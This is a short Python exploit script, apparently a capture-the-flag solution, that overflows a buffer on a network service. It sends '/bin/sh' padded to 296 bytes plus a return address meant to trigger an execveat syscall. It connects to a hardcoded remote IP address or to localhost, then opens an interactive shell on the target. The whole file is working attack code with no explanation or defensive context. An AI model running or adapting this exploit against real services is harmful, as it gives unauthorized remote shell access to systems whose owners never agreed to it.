import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    buf = "/bin/sh\0"
    buf = buf.ljust(296,"A")
    #buf += "A"*(296-len(buf))
    buf += p(0x00000000004000ed) 
    buf += "A"*18 # Padding for adjustment rax to set systemcall #322 stub_execveat
    f.write(buf)

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("159.65.125.233", 6009)
        main()
    else:
        s, f = sock("localhost", 6009)
        main()
